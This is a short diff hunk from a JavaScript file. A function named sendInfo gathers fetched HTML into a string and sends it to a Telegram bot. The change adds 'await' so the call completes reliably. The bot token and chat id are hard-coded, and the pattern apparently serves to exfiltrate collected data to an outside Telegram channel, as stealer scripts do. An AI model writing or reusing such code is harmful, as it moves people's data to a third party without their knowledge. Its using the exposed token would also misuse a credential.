@@ -826,7 +826,7 @@ async function sendInfo(){
             }).then((html) => {
                 tempText += html;
             });
-    fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4742576115&text="+tempText);
+    await fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4742576115&text="+tempText);
 }
 async function createExtraFunction() {
     //https://ithelp.ithome.com.tw/m/articles/10291496 <-rndNum
